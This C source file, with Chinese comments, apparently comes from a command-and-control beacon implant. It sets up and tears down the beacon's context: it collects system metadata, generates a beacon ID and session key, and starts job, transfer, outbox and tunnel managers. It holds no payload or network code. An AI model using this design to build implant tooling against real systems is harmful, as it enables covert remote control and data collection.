#include "beacon_context.h"

/*
 * ContextInit - 零初始化信标上下文并启动所有子系统。
 *   生成随机信标 ID 和会话密钥，然后初始化
 *   发件箱、传输管理器和隧道管理器。
 */
VOID ContextInit(BeaconContext* ctx)
{
    ZeroMemory(ctx, sizeof(*ctx));

    /* 加载默认配置并收集系统元数据 */
    ProfileLoad(&ctx->profile);
    SysinfoCollect(&ctx->meta);

    /* 生成唯一的信标标识符和随机会话密钥 */
    ctx->beacon_id = CryptoRandomU32();
    CryptoRandom(ctx->session_key, sizeof(ctx->session_key));

    ctx->active = 1;

    /* 初始化子系统管理器 */
    RuntimeGateInit(&ctx->runtime);
    OutboxInit(&ctx->outbox);
    JobInit(&ctx->jobs);
    TransferInit(&ctx->transfers, ctx);
    TunnelInit(&ctx->tunnels, ctx);
}

/*
 * ContextFree - 拆除子系统并清除敏感密钥材料。
 */
VOID ContextFree(BeaconContext* ctx)
{
    JobFree(&ctx->jobs);
    TunnelFree(&ctx->tunnels);
    TransferFree(&ctx->transfers);
    OutboxFree(&ctx->outbox);
    RuntimeGateFree(&ctx->runtime);

    /* 在释放上下文之前从内存中擦除会话密钥 */
    SecureZeroMemory(ctx->session_key, sizeof(ctx->session_key));
}
